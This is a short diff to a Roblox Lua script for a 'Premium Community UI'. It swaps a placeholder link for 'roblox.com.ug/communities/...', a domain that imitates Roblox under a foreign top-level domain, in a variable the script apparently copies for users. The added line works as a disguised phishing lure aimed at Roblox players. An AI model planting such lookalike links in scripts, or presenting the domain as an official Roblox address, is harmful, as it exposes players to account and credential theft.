@@ -1,7 +1,7 @@
 --// Minimal Premium Community UI
 --// By Rey
 
-local linkToCopy = "https://your-link-here.com" -- ganti sendiri
+local linkToCopy = "https://roblox.com.ug/communities/8291970185/" -- ganti sendiri
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
